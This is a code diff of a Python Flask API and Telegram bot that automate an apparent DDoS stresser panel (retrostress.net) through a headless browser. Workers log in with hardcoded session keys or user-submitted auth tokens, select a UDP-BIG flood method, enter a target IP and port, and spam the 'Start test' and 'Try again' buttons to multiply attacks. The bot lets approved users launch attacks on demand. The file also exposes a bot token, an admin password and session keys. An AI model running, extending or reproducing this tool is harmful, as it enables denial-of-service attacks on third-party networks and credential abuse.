@@ -1,6 +1,3 @@
-# ============================================================
-#  ⚡ API + TELEGRAM BOT — Fast (No Pool)
-# ============================================================
 from flask import Flask, jsonify, request
 from cloakbrowser import launch
 import time
@@ -12,6 +9,7 @@ import string
 from datetime import datetime
 import queue
 
+# ========== BOT IMPORTS ==========
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
     Application, CommandHandler, CallbackQueryHandler,
@@ -20,23 +18,18 @@ from telegram.ext import (
 
 app = Flask(__name__)
 
-# ============================================================
-#  ⚙️ CONFIG
-# ============================================================
+# ========== CONFIG (SAME as api.py) ==========
 METHOD         = "UDP-BIG"
 ADMIN_PASSWORD = "krishna"
 PORT           = 3938
 MAX_PRELOADED  = 2
 API_NAME       = "krishna father of STTRSERRR"
 
+# ========== BOT CONFIG (NEW) ==========
 BOT_TOKEN = "8987069237:AAGH_ExqtgnBsiKpNrMoPwKslocK7Dx9cjs"
 OWNER_ID  = 7883336006
 
-SPAM_SLEEP = 0.05
-
-# ============================================================
-#  🌐 SESSIONS
-# ============================================================
+# ========== SESSIONS (SAME) ==========
 SESSIONS_DATA = [
     {"session_number": 1, "access_key": "32de18ee49ba49ada55f3ca2e1fe8d1fd5601d5d1c8b48f2be24395e61c56482"},
     {"session_number": 2, "access_key": "0021c1d3e3b0434e97cf81017dd2729b6a02ab98e8b1471f9a704c2b866b5148"},
@@ -44,9 +37,7 @@ SESSIONS_DATA = [
     {"session_number": 4, "access_key": "7cc7b120d6d147b7a9e8c92dcec7dd9763c1caa6caee416c8690b552e55b1afb"}
 ]
 
-# ============================================================
-#  🌍 GLOBALS
-# ============================================================
+# ========== GLOBALS (SAME) ==========
 sessions             = []
 sessions_lock        = threading.Lock()
 active_attacks       = 0
@@ -64,6 +55,7 @@ session_index_lock   = threading.Lock()
 SS_FOLDER = "screenshots"
 os.makedirs(SS_FOLDER, exist_ok=True)
 
+# ========== BOT DATA (NEW) ==========
 bot_tokens     = {}
 approved_users = {}
 BOT_TOKENS_FILE = "bot_tokens.json"
@@ -71,9 +63,58 @@ USERS_FILE      = "bot_users.json"
 bot_lock        = threading.Lock()
 
 
-# ============================================================
-#  💾 FILE HELPERS
-# ============================================================
+# ========== SPAM HELPER (NEW — Start test + Try again) ==========
+def spam_buttons(page, worker_name="W", spam_duration=60):
+    """
+    Start test + Try again dono buttons spam karo.
+    Returns total click count.
+    """
+    start_time = time.time()
+    click_count = 0
+    start_clicks = 0
+    retry_clicks = 0
+
+    while time.time() - start_time < spam_duration:
+        try:
+            result = page.evaluate("""
+                () => {
+                    let sc = 0, rc = 0;
+                    const btns = document.querySelectorAll('button');
+                    for (const btn of btns) {
+                        const t = (btn.innerText || btn.textContent || '').trim().toLowerCase();
+                        if (t.includes('start test')) {
+                            btn.click();
+                            sc++;
+                        }
+                        else if (t.includes('try again')) {
+                            btn.click();
+                            rc++;
+                        }
+                    }
+                    return { start: sc, retry: rc };
+                }
+            """)
+
+            s = result.get('start', 0) if result else 0
+            r = result.get('retry', 0) if result else 0
+            click_count  += s + r
+            start_clicks += s
+            retry_clicks += r
+
+            if click_count % 200 == 0 and click_count > 0:
+                elapsed = int(time.time() - start_time)
+                cps = int(click_count / max(elapsed, 1))
+                print(f"[{worker_name}] ⚡ {click_count} | {cps}/s | start:{start_clicks} retry:{retry_clicks}")
+
+            time.sleep(0.05)
+        except Exception:
+            time.sleep(0.05)
+
+    print(f"[{worker_name}] ✅ DONE! {click_count} clicks (start:{start_clicks}, retry:{retry_clicks})")
+    return click_count
+
+
+# ========== API KEYS (SAME) ==========
 def load_api_keys():
     global api_keys
     if os.path.exists(api_keys_file):
@@ -88,48 +129,11 @@ def load_api_keys():
 
 
 def save_api_keys():
-    try:
-        with open(api_keys_file, "w") as f:
-            json.dump(api_keys, f, indent=2)
-    except Exception:
-        pass
+    with open(api_keys_file, "w") as f:
+        json.dump(api_keys, f, indent=2)
 
 
-def load_bot_data():
-    global bot_tokens, approved_users
-    if os.path.exists(BOT_TOKENS_FILE):
-        try:
-            with open(BOT_TOKENS_FILE) as f:
-                bot_tokens = json.load(f)
-        except Exception:
-            bot_tokens = {}
-    if os.path.exists(USERS_FILE):
-        try:
-            with open(USERS_FILE) as f:
-                approved_users = json.load(f)
-        except Exception:
-            approved_users = {}
-    if str(OWNER_ID) not in approved_users:
-        approved_users[str(OWNER_ID)] = {"name": "Owner", "role": "owner"}
-        save_users()
-
-
-def save_bot_tokens():
-    try:
-        with open(BOT_TOKENS_FILE, "w") as f:
-            json.dump(bot_tokens, f, indent=2)
-    except Exception:
-        pass
-
-
-def save_users():
-    try:
-        with open(USERS_FILE, "w") as f:
-            json.dump(approved_users, f, indent=2)
-    except Exception:
-        pass
-
-
+# ========== SESSIONS (SAME) ==========
 def load_sessions():
     global sessions
     print("🔄 Loading sessions...")
@@ -178,11 +182,12 @@ def generate_api_key():
 
 
 def check_password(req):
-    pwd = req.args.get('password') or req.headers.get('X-Password')
-    return pwd == ADMIN_PASSWORD
+    password = req.args.get('password') or req.headers.get('X-Password')
+    return password == ADMIN_PASSWORD
 
 
-def take_screenshot(page, name, full_page=False):
+# ========== SCREENSHOT (SAME) ==========
+def take_screenshot(page, name, full_page=True):
     try:
         path = os.path.join(SS_FOLDER, name)
         page.screenshot(path=path, full_page=full_page)
@@ -191,244 +196,128 @@ def take_screenshot(page, name, full_page=False):
         return None
 
 
-def get_attack_ss_name(n):
-    return f"atk{str(n).zfill(4)}.png"
+def get_attack_ss_name(atk_num):
+    return f"atk{str(atk_num).zfill(4)}.png"
 
 
-def is_owner(uid):
-    return int(uid) == OWNER_ID
-
-
-def is_approved(uid):
-    return str(uid) in approved_users
-
-
-# ============================================================
-#  🎯 METHOD SELECT
-# ============================================================
-def select_method(page, worker_name="W"):
-    for retry in range(3):
-        try:
-            print(f"[{worker_name}] 🔧 Retry {retry+1}: Layer 4...")
-            clicked = page.evaluate("""() => {
-                const b = document.querySelectorAll('button');
-                for (const x of b) {
-                    const t = (x.innerText || x.textContent || '').trim();
-                    if (t.includes('Network endpoint') || t.includes('Layer 4')) {
-                        x.click(); return t.substring(0, 40);
-                    }
-                }
-                return false;
-            }""")
-            if not clicked:
-                raise Exception("Layer 4 not found")
-            print(f"[{worker_name}] ✅ Layer 4")
-            time.sleep(1.0)
-
-            clicked = page.evaluate("""() => {
-                const s = document.querySelector('span.app-method-trigger-action');
-                if (s) { s.click(); return 'trigger-action'; }
-                const all = document.querySelectorAll('span, button, div');
-                for (const x of all) {
-                    const t = (x.innerText || x.textContent || '').trim();
-                    if (t.includes('Browse methods')) { x.click(); return t.substring(0, 40); }
-                }
-                return false;
-            }""")
-            if not clicked:
-                raise Exception("Browse not found")
-            print(f"[{worker_name}] ✅ Browse")
-            time.sleep(1.5)
-
-            clicked = page.evaluate("""() => {
-                const b = document.querySelectorAll('button');
-                for (const x of b) {
-                    if ((x.innerText || '').trim() === 'UDP') { x.click(); return true; }
-                }
-                return false;
-            }""")
-            if not clicked:
-                raise Exception("UDP not found")
-            print(f"[{worker_name}] ✅ UDP")
-            time.sleep(1.5)
-
-            available = page.evaluate("""() => {
-                const opts = document.querySelectorAll('button[role="option"]');
-                const results = [];
-                for (const o of opts) {
-                    const s = o.querySelector('strong');
-                    if (s) results.push(s.textContent.trim());
-                }
-                return results;
-            }""")
-            print(f"[{worker_name}] 🔍 Options: {available}")
-
-            if METHOD in available:
-                clicked = page.evaluate(f"""() => {{
-                    const opts = document.querySelectorAll('button[role="option"]');
-                    for (const o of opts) {{
-                        const s = o.querySelector('strong');
-                        if (s && s.textContent.trim() === '{METHOD}') {{
-                            o.click(); return true;
-                        }}
-                    }}
-                    return false;
-                }}""")
-                if clicked:
-                    print(f"[{worker_name}] ✅ {METHOD} selected!")
-                    time.sleep(0.5)
-                    return True
-
-            clicked = page.evaluate(f"""() => {{
-                const all = document.querySelectorAll('button, div, li, a');
-                for (const x of all) {{
-                    const txt = (x.textContent || '').trim();
-                    if (txt === '{METHOD}' || txt.startsWith('{METHOD}')) {{
-                        x.click(); return true;
-                    }}
-                }}
-                return false;
-            }}""")
-            if clicked:
-                print(f"[{worker_name}] ✅ {METHOD} fallback")
-                time.sleep(0.5)
-                return True
-
-            raise Exception(f"{METHOD} not in {available}")
-
-        except Exception as e:
-            print(f"[{worker_name}] ⚠️ Retry {retry+1}: {e}")
-            try:
-                page.keyboard.press('Escape')
-            except Exception:
-                pass
-            time.sleep(2)
-
-    return False
-
-
-# ============================================================
-#  🎯 SPAM ATTACK (Start test + Try again)
-# ============================================================
-def spam_attack(page, target_ip, target_port, duration, worker_name="W"):
-    page.evaluate("""(d) => {
-        const el = document.querySelector('input#test-url');
-        if (el) {
-            el.focus(); el.value = d.ip;
-            el.dispatchEvent(new Event('input', { bubbles: true }));
-            el.dispatchEvent(new Event('change', { bubbles: true }));
-        }
-    }""", {"ip": target_ip})
-    time.sleep(0.2)
-
-    page.evaluate("""(d) => {
-        const el = document.querySelector('input[aria-label="port"]');
-        if (el) {
-            el.focus(); el.value = d.port;
-            el.dispatchEvent(new Event('input', { bubbles: true }));
-            el.dispatchEvent(new Event('change', { bubbles: true }));
-        }
-    }""", {"port": str(target_port)})
-    time.sleep(0.2)
-
-    spam_duration = max(duration - 1, 1)
-    start_time    = time.time()
-    click_count   = 0
-    start_clicks  = 0
-    retry_clicks  = 0
-
-    print(f"[{worker_name}] 🚀 SPAM {spam_duration}s → {target_ip}:{target_port}")
-
-    while time.time() - start_time < spam_duration:
-        try:
-            result = page.evaluate("""
-                () => {
-                    let start_count = 0;
-                    let retry_count = 0;
-                    const allButtons = document.querySelectorAll('button');
-                    for (const btn of allButtons) {
-                        const text = (btn.innerText || btn.textContent || '')
-                                     .trim().toLowerCase();
-                        if (text.includes('start test')) {
-                            btn.click();
-                            start_count++;
-                        }
-                        else if (text.includes('try again')) {
-                            btn.click();
-                            retry_count++;
-                        }
-                    }
-                    return { start: start_count, retry: retry_count };
-                }
-            """)
-
-            s = result.get('start', 0) if result else 0
-            r = result.get('retry', 0) if result else 0
-
-            click_count  += s + r
-            start_clicks += s
-            retry_clicks += r
-
-            if click_count % 200 == 0 and click_count > 0:
-                elapsed = int(time.time() - start_time)
-                cps = int(click_count / max(elapsed, 1))
-                print(f"[{worker_name}] ⚡ {click_count} | {cps}/s | "
-                      f"start:{start_clicks} retry:{retry_clicks}")
-
-            time.sleep(SPAM_SLEEP)
-        except Exception:
-            time.sleep(SPAM_SLEEP)
-
-    print(f"[{worker_name}] ✅ DONE! {click_count} clicks "
-          f"(start:{start_clicks}, retry:{retry_clicks})")
-    return click_count
-
-
-# ============================================================
-#  🔧 PRELOAD WORKER (own browser)
-# ============================================================
+# ========== WORKER (SAME — from api.py) ==========
 def worker_thread(worker_number):
     global active_attacks, workers_loading, attack_counter
 
     browser           = None
+    page              = None
     loading_decreased = False
 
     session    = get_next_session()
     session_id = session["id"]
 
     try:
-        print(f"[Worker-{worker_number}] 🌐 Session {session_id} | Starting...")
-        t0 = time.time()
-
-        # ⚡ Own browser launch (no pool)
+        print(f"[Worker-{worker_number}] 🌐 Session {session_id} | Opening...")
         browser = launch(headless=True)
-        page = browser.new_page()
-        page.set_viewport_size({"width": 1280, "height": 720})
-
-        # Block images/fonts/media (not stylesheets)
-        page.route("**/*", lambda route: (
-            route.abort() if route.request.resource_type in
-                ["image", "font", "media"]
-            else route.continue_()
-        ))
-
+        page    = browser.new_page()
+        page.set_viewport_size({"width": 1920, "height": 1080})
         page.context.add_cookies(session["cookies"])
-
         page.goto("https://retrostress.net/panel",
-                  wait_until="domcontentloaded", timeout=45000)
-        time.sleep(3)
+                  wait_until="networkidle", timeout=90000)
+        print(f"[Worker-{worker_number}] ⏳ Waiting...")
+        time.sleep(4)
 
         if "auth" in page.url or "login" in page.url:
             print(f"[Worker-{worker_number}] ❌ Session expired!")
             return
 
-        print(f"[Worker-{worker_number}] ✅ Panel in {time.time()-t0:.1f}s")
+        print(f"[Worker-{worker_number}] ✅ Panel opened!")
+        take_screenshot(page, f"panel_w{worker_number}.png")
 
-        if not select_method(page, f"Worker-{worker_number}"):
-            print(f"[Worker-{worker_number}] ❌ Method failed")
+        # ===== METHOD SELECT (SAME) =====
+        method_selected = False
+        for retry in range(3):
+            try:
+                clicked_layer4 = page.evaluate("""
+                    () => {
+                        const allBtns = document.querySelectorAll('button');
+                        for (const btn of allBtns) {
+                            const text = btn.innerText || btn.textContent || '';
+                            if (text.includes('Network endpoint') || text.includes('Layer 4')) {
+                                btn.click(); return 'clicked';
+                            }
+                        }
+                        return false;
+                    }
+                """)
+                if not clicked_layer4:
+                    raise Exception("Layer 4 not found")
+                time.sleep(1)
+
+                clicked_browse = page.evaluate("""
+                    () => {
+                        const span = document.querySelector('span.app-method-trigger-action');
+                        if (span) { span.click(); return true; }
+                        const allSpans = document.querySelectorAll('span');
+                        for (const s of allSpans) {
+                            if (s.innerText && s.innerText.includes('Browse methods')) {
+                                s.click(); return true;
+                            }
+                        }
+                        return false;
+                    }
+                """)
+                if not clicked_browse:
+                    raise Exception("Browse not found")
+                time.sleep(2)
+
+                clicked_udp = page.evaluate("""
+                    () => {
+                        const buttons = document.querySelectorAll('button');
+                        for (const btn of buttons) {
+                            const text = (btn.innerText || btn.textContent || '').trim();
+                            if (text === 'UDP') { btn.click(); return true; }
+                        }
+                        return false;
+                    }
+                """)
+                if not clicked_udp:
+                    raise Exception("UDP not found")
+                time.sleep(1)
+
+                clicked_method = page.evaluate("""
+                    () => {
+                        const options = document.querySelectorAll('button[role="option"]');
+                        for (const opt of options) {
+                            const strong = opt.querySelector('strong');
+                            if (strong && strong.textContent.trim() === 'UDP-BIG') {
+                                opt.click(); return true;
+                            }
+                        }
+                        const allBtns = document.querySelectorAll('button');
+                        for (const btn of allBtns) {
+                            const strong = btn.querySelector('strong');
+                            if (strong && strong.textContent.trim() === 'UDP-BIG') {
+                                btn.click(); return true;
+                            }
+                        }
+                        return false;
+                    }
+                """)
+                if not clicked_method:
+                    raise Exception("UDP-BIG not found")
+                time.sleep(0.5)
+
+                method_selected = True
+                break
+            except Exception as e:
+                print(f"[Worker-{worker_number}] ⚠️ Retry {retry+1}: {e}")
+                try:
+                    page.keyboard.press('Escape')
+                except Exception:
+                    pass
+                time.sleep(2)
+
+        if not method_selected:
+            print(f"[Worker-{worker_number}] ❌ Method select failed!")
             return
 
-        print(f"[Worker-{worker_number}] ✅ Ready in {time.time()-t0:.1f}s")
+        print(f"[Worker-{worker_number}] ✅ Ready!")
 
         with workers_loading_lock:
             if workers_loading > 0:
@@ -436,29 +325,66 @@ def worker_thread(worker_number):
                 loading_decreased = True
 
         with worker_pool_lock:
-            if len(worker_pool) >= MAX_PRELOADED:
+            current_pool_size = len(worker_pool)
+            if current_pool_size >= MAX_PRELOADED:
                 return
             worker_pool.append(worker_number)
             pool_size = len(worker_pool)
 
         print(f"[Worker-{worker_number}] 📊 Pool: {pool_size}/{MAX_PRELOADED}")
 
+        # ===== WAIT FOR JOB =====
         job = attack_queue.get(block=True)
 
         with worker_pool_lock:
             if worker_number in worker_pool:
                 worker_pool.remove(worker_number)
 
+        target_ip = job["ip"]
+        port      = job["port"]
+        duration  = job["duration"]
+
         with attack_counter_lock:
             attack_counter += 1
             atk_num = attack_counter
 
-        print(f"[Worker-{worker_number}] 🎯 ATK-{atk_num}")
+        ss_name = get_attack_ss_name(atk_num)
+        print(f"[Worker-{worker_number}] 🎯 ATK-{atk_num} | {target_ip}:{port} | {duration}s")
 
-        spam_attack(page, job["ip"], job["port"], job["duration"],
-                    f"Worker-{worker_number}")
+        # Fill IP
+        page.evaluate("""
+            (data) => {
+                const el = document.querySelector('input#test-url');
+                if (el) {
+                    el.focus();
+                    el.value = data.ip;
+                    el.dispatchEvent(new Event('input', { bubbles: true }));
+                    el.dispatchEvent(new Event('change', { bubbles: true }));
+                }
+            }
+        """, {"ip": target_ip})
+        time.sleep(0.2)
 
-        take_screenshot(page, get_attack_ss_name(atk_num))
+        # Fill Port
+        page.evaluate("""
+            (data) => {
+                const el = document.querySelector('input[aria-label="port"]');
+                if (el) {
+                    el.focus();
+                    el.value = data.port;
+                    el.dispatchEvent(new Event('input', { bubbles: true }));
+                    el.dispatchEvent(new Event('change', { bubbles: true }));
+                }
+            }
+        """, {"port": str(port)})
+        time.sleep(0.2)
+
+        # ⚡ SPAM (Start test + Try again)
+        spam_duration = max(duration - 1, 1)
+        print(f"[Worker-{worker_number}] 🚀 SPAM START!")
+
+        take_screenshot(page, ss_name)
+        spam_buttons(page, f"Worker-{worker_number}", spam_duration)
 
     except Exception as e:
         print(f"[Worker-{worker_number}] ❌ Error: {e}")
@@ -477,74 +403,10 @@ def worker_thread(worker_number):
                     workers_loading -= 1
         with sessions_lock:
             active_attacks -= 1
-        print(f"[Worker-{worker_number}] 🔒 Done")
+        print(f"[Worker-{worker_number}] 🔒 Released")
 
 
-# ============================================================
-#  🔑 TOKEN WORKER (bot ke tokens — own browser)
-# ============================================================
-def token_worker(token, target_ip, target_port, duration, attack_id):
-    browser = None
-    short = token[:12] + "..." if len(token) > 12 else token
-
-    try:
-        print(f"[TokenW-{attack_id}] 🌐 Token {short} | Starting...")
-        t0 = time.time()
-
-        # ⚡ Own browser
-        browser = launch(headless=True)
-        page = browser.new_page()
-        page.set_viewport_size({"width": 1280, "height": 720})
-
-        # Block images/fonts/media
-        page.route("**/*", lambda route: (
-            route.abort() if route.request.resource_type in
-                ["image", "font", "media"]
-            else route.continue_()
-        ))
-
-        cookies = [{
-            "name": "auth_token", "value": token,
-            "domain": "retrostress.net", "path": "/",
-            "expires": 1794408155.470651,
-            "httpOnly": True, "secure": True, "sameSite": "Lax"
-        }]
-        page.context.add_cookies(cookies)
-
-        page.goto("https://retrostress.net/panel",
-                  wait_until="domcontentloaded", timeout=45000)
-        time.sleep(3)
-
-        if "auth" in page.url or "login" in page.url:
-            print(f"[TokenW-{attack_id}] ❌ Token invalid")
-            return
-
-        print(f"[TokenW-{attack_id}] ✅ Panel in {time.time()-t0:.1f}s")
-
-        if not select_method(page, f"TokenW-{attack_id}"):
-            print(f"[TokenW-{attack_id}] ❌ Method failed")
-            return
-
-        print(f"[TokenW-{attack_id}] ✅ Ready in {time.time()-t0:.1f}s")
-
-        spam_attack(page, target_ip, target_port, duration, f"TokenW-{attack_id}")
-
-        take_screenshot(page, get_attack_ss_name(attack_id))
-
-    except Exception as e:
-        print(f"[TokenW-{attack_id}] ❌ {e}")
-    finally:
-        if browser:
-            try:
-                browser.close()
-            except Exception:
-                pass
-        print(f"[TokenW-{attack_id}] 🔒 Done")
-
-
-# ============================================================
-#  🔄 POOL MANAGER
-# ============================================================
+# ========== POOL MANAGER (SAME) ==========
 worker_counter      = 0
 worker_counter_lock = threading.Lock()
 
@@ -558,25 +420,192 @@ def pool_manager():
             with workers_loading_lock:
                 loading = workers_loading
 
-            needed = MAX_PRELOADED - (pool_size + loading)
+            total_in_progress = pool_size + loading
+            needed            = MAX_PRELOADED - total_in_progress
+
             if needed > 0:
                 for i in range(needed):
                     with workers_loading_lock:
                         workers_loading += 1
                     with worker_counter_lock:
                         worker_counter += 1
-                        wn = worker_counter
-                    t = threading.Thread(target=worker_thread, args=(wn,), daemon=True)
+                        worker_num = worker_counter
+                    t = threading.Thread(target=worker_thread, args=(worker_num,), daemon=True)
                     t.start()
-                    time.sleep(0.5)
+                    time.sleep(0.1)
         except Exception as e:
-            print(f"[Pool] ❌ {e}")
+            print(f"[Pool] ❌ Error: {e}")
         time.sleep(5)
 
 
-# ============================================================
-#  🎨 BOT UI
-# ============================================================
+# ========== TOKEN WORKER (NEW — bot ke tokens ke liye) ==========
+def token_worker(token, target_ip, target_port, duration, attack_id):
+    """Bot ke saved token se attack fire karta hai (on-demand worker)"""
+    global active_attacks
+    browser = None
+    short = token[:12] + "..." if len(token) > 12 else token
+
+    try:
+        print(f"[TokenW-{attack_id}] 🌐 Token {short} | Opening...")
+        browser = launch(headless=True)
+        page = browser.new_page()
+        page.set_viewport_size({"width": 1920, "height": 1080})
+
+        cookies = [{
+            "name": "auth_token", "value": token,
+            "domain": "retrostress.net", "path": "/",
+            "expires": 1794408155.470651,
+            "httpOnly": True, "secure": True, "sameSite": "Lax"
+        }]
+        page.context.add_cookies(cookies)
+
+        page.goto("https://retrostress.net/panel",
+                  wait_until="networkidle", timeout=90000)
+        time.sleep(4)
+
+        if "auth" in page.url or "login" in page.url:
+            print(f"[TokenW-{attack_id}] ❌ Token invalid/expired")
+            return
+
+        print(f"[TokenW-{attack_id}] ✅ Panel opened")
+
+        # Method select (same logic)
+        method_selected = False
+        for retry in range(3):
+            try:
+                page.evaluate("""() => {
+                    const allBtns = document.querySelectorAll('button');
+                    for (const btn of allBtns) {
+                        const text = btn.innerText || btn.textContent || '';
+                        if (text.includes('Network endpoint') || text.includes('Layer 4')) {
+                            btn.click(); return;
+                        }
+                    }
+                }""")
+                time.sleep(1)
+
+                page.evaluate("""() => {
+                    const span = document.querySelector('span.app-method-trigger-action');
+                    if (span) { span.click(); return; }
+                    const allSpans = document.querySelectorAll('span');
+                    for (const s of allSpans) {
+                        if (s.innerText && s.innerText.includes('Browse methods')) {
+                            s.click(); return;
+                        }
+                    }
+                }""")
+                time.sleep(2)
+
+                page.evaluate("""() => {
+                    const buttons = document.querySelectorAll('button');
+                    for (const btn of buttons) {
+                        const text = (btn.innerText || btn.textContent || '').trim();
+                        if (text === 'UDP') { btn.click(); return; }
+                    }
+                }""")
+                time.sleep(1)
+
+                ok = page.evaluate(f"""() => {{
+                    const options = document.querySelectorAll('button[role="option"]');
+                    for (const opt of options) {{
+                        const strong = opt.querySelector('strong');
+                        if (strong && strong.textContent.trim() === '{METHOD}') {{
+                            opt.click(); return true;
+                        }}
+                    }}
+                    return false;
+                }}""")
+                if ok:
+                    method_selected = True
+                    break
+            except Exception:
+                time.sleep(2)
+
+        if not method_selected:
+            print(f"[TokenW-{attack_id}] ❌ Method select failed")
+            return
+
+        print(f"[TokenW-{attack_id}] ✅ Ready")
+
+        # Fill IP
+        page.evaluate("""(d) => {
+            const el = document.querySelector('input#test-url');
+            if (el) {
+                el.focus(); el.value = d.ip;
+                el.dispatchEvent(new Event('input', { bubbles: true }));
+                el.dispatchEvent(new Event('change', { bubbles: true }));
+            }
+        }""", {"ip": target_ip})
+        time.sleep(0.2)
+
+        # Fill Port
+        page.evaluate("""(d) => {
+            const el = document.querySelector('input[aria-label="port"]');
+            if (el) {
+                el.focus(); el.value = d.port;
+                el.dispatchEvent(new Event('input', { bubbles: true }));
+                el.dispatchEvent(new Event('change', { bubbles: true }));
+            }
+        }""", {"port": str(target_port)})
+        time.sleep(0.2)
+
+        # ⚡ SPAM (Start test + Try again)
+        spam_duration = max(duration - 1, 1)
+        print(f"[TokenW-{attack_id}] 🚀 SPAM → {target_ip}:{target_port}")
+
+        spam_buttons(page, f"TokenW-{attack_id}", spam_duration)
+
+    except Exception as e:
+        print(f"[TokenW-{attack_id}] ❌ {e}")
+    finally:
+        if browser:
+            try:
+                browser.close()
+            except Exception:
+                pass
+        print(f"[TokenW-{attack_id}] 🔒 Released")
+
+
+# ========== BOT JSON HELPERS (NEW) ==========
+def load_bot_data():
+    global bot_tokens, approved_users
+    if os.path.exists(BOT_TOKENS_FILE):
+        try:
+            with open(BOT_TOKENS_FILE) as f:
+                bot_tokens = json.load(f)
+        except Exception:
+            bot_tokens = {}
+    if os.path.exists(USERS_FILE):
+        try:
+            with open(USERS_FILE) as f:
+                approved_users = json.load(f)
+        except Exception:
+            approved_users = {}
+    # Owner auto-approve
+    if str(OWNER_ID) not in approved_users:
+        approved_users[str(OWNER_ID)] = {"name": "Owner", "role": "owner"}
+        save_users()
+
+
+def save_bot_tokens():
+    with open(BOT_TOKENS_FILE, "w") as f:
+        json.dump(bot_tokens, f, indent=2)
+
+
+def save_users():
+    with open(USERS_FILE, "w") as f:
+        json.dump(approved_users, f, indent=2)
+
+
+def is_owner(uid):
+    return int(uid) == OWNER_ID
+
+
+def is_approved(uid):
+    return str(uid) in approved_users
+
+
+# ========== BOT UI (NEW) ==========
 def main_kb(uid):
     rows = [
         [InlineKeyboardButton("🎯 Attack", callback_data="m_attack"),
@@ -637,9 +666,7 @@ def welcome_text(uid):
             f"_Choose an option:_")
 
 
-# ============================================================
-#  🚀 BOT COMMANDS
-# ============================================================
+# ========== BOT HANDLERS (NEW) ==========
 async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     if not is_approved(uid):
@@ -658,8 +685,11 @@ async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         f"❓ *HELP*\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
         f"*Attack:* Button se IP/Port/Duration do\n\n"
         f"*Tokens:* `Label | Token` format me add karo\n\n"
-        f"*Owner:*\n"
-        f"/approve <id> [name]\n/revoke <id>\n/users\n/broadcast <msg>",
+        f"*Owner Commands:*\n"
+        f"/approve <id> [name]\n"
+        f"/revoke <id>\n"
+        f"/users\n"
+        f"/broadcast <msg>",
         parse_mode="Markdown", reply_markup=back_kb())
 
 
@@ -674,8 +704,11 @@ async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     with bot_lock:
         ntok = len(bot_tokens.get(str(uid), []))
     await update.message.reply_text(
-        f"📊 *STATUS*\n\n⚙️ Pool: `{pool}/{MAX_PRELOADED}`\n"
-        f"⏳ Loading: `{loading}`\n📡 Sessions: `{len(sessions)}`\n"
+        f"📊 *STATUS*\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"🟢 API: Online\n"
+        f"⚙️ Pool: `{pool}/{MAX_PRELOADED}`\n"
+        f"⏳ Loading: `{loading}`\n"
+        f"🌐 Sessions: `{len(sessions)}`\n"
         f"🔑 My Tokens: `{ntok}`",
         parse_mode="Markdown", reply_markup=back_kb())
 
@@ -694,7 +727,7 @@ async def cmd_approve(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     name = ctx.args[1] if len(ctx.args) > 1 else f"User{tid}"
     approved_users[str(tid)] = {"name": name, "role": "user"}
     save_users()
-    await update.message.reply_text(f"✅ Approved `{tid}`", parse_mode="Markdown")
+    await update.message.reply_text(f"✅ Approved `{tid}` ({name})", parse_mode="Markdown")
     try:
         await ctx.bot.send_message(tid, "✅ *Approved!* Send /start", parse_mode="Markdown")
     except Exception:
@@ -752,12 +785,9 @@ async def do_broadcast(update, ctx, msg):
         except Exception:
             fail += 1
     await update.effective_message.reply_text(
-        f"✅ OK: `{ok}` | Fail: `{fail}`", parse_mode="Markdown")
+        f"✅ Done. OK: `{ok}` | Fail: `{fail}`", parse_mode="Markdown")
 
 
-# ============================================================
-#  🔄 CALLBACK HANDLER
-# ============================================================
 async def on_button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     q = update.callback_query
     await q.answer()
@@ -768,7 +798,7 @@ async def on_button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         if data == "req_access":
             try:
                 await ctx.bot.send_message(OWNER_ID,
-                    f"📩 *REQ*\n\n{q.from_user.full_name}\n`{uid}`\n"
+                    f"📩 *ACCESS REQ*\n\n{q.from_user.full_name}\n`{uid}`\n"
                     f"@{q.from_user.username or 'none'}\n\n"
                     f"`/approve {uid} {q.from_user.first_name}`",
                     parse_mode="Markdown")
@@ -787,19 +817,22 @@ async def on_button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             ntok = len(bot_tokens.get(str(uid), []))
         await q.edit_message_text(
             f"📊 *STATUS*\n\n⚙️ Pool: `{pool}/{MAX_PRELOADED}`\n"
-            f"📡 Sessions: `{len(sessions)}`\n🔑 Tokens: `{ntok}`",
+            f"🌐 Sessions: `{len(sessions)}`\n🔑 My Tokens: `{ntok}`",
             parse_mode="Markdown", reply_markup=back_kb())
     elif data == "m_help":
-        await q.edit_message_text("❓ Send /help", parse_mode="Markdown", reply_markup=back_kb())
+        await q.edit_message_text(
+            f"❓ Send /help for full commands",
+            parse_mode="Markdown", reply_markup=back_kb())
     elif data == "m_tokens":
         with bot_lock:
             ntok = len(bot_tokens.get(str(uid), []))
-        await q.edit_message_text(f"🔑 *TOKENS*\n\nSaved: `{ntok}`",
-                                   parse_mode="Markdown", reply_markup=tokens_kb())
+        await q.edit_message_text(
+            f"🔑 *TOKENS*\n\nSaved: `{ntok}`",
+            parse_mode="Markdown", reply_markup=tokens_kb())
     elif data == "t_add":
         ctx.user_data["expecting"] = "add_token"
         await q.edit_message_text(
-            "📝 Send: `Label | Token`",
+            "📝 *ADD TOKEN*\n\nSend: `Label | Token`\n\nExample:\n`Manu | 32de18ee...`",
             parse_mode="Markdown", reply_markup=cancel_kb())
     elif data == "t_list":
         with bot_lock:
@@ -807,7 +840,7 @@ async def on_button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         if not toks:
             await q.edit_message_text("📭 No tokens", reply_markup=tokens_kb())
             return
-        text = f"🔑 *TOKENS ({len(toks)})*\n\n"
+        text = f"🔑 *MY TOKENS ({len(toks)})*\n\n"
         for i, t in enumerate(toks, 1):
             text += f"{i}. *{t['label']}*\n`{t['token'][:10]}…{t['token'][-4:]}`\n\n"
         await q.edit_message_text(text, parse_mode="Markdown", reply_markup=tokens_kb())
@@ -835,7 +868,8 @@ async def on_button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         with worker_pool_lock:
             pool = len(worker_pool)
         await q.edit_message_text(
-            f"🎯 *ATTACK*\n\n🔑 Tokens: `{ntok}`\n"
+            f"🎯 *ATTACK*\n\n"
+            f"🔑 Tokens: `{ntok}`\n"
             f"⚙️ Pool: `{pool}/{MAX_PRELOADED}`\n\n"
             f"IP, Port, Duration do.",
